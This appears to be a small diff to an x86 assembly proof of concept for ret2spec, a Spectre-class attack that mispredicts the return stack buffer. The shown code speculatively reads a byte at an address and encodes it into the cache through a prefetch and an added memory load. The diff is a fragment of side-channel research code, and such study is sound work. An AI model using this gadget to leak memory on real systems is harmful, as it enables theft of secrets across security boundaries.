@@ -25,7 +25,7 @@ ret2spec:
   // ret2spec_end, so the instructions between the call and
   // the ret2spec_end label are never executed (except speculatively)
   call rsb_mispredict
-
+  
   // Leak the value at (%rdi)
   movb (%rdi), %al
 
@@ -34,6 +34,7 @@ ret2spec:
   // executed. They have a side effect on the cache
   shl $0xc, %eax
   prefetcht0 (%rsi, %rax)
+  mov (%rsi, %rax), %r8
   mfence
 
 loop:
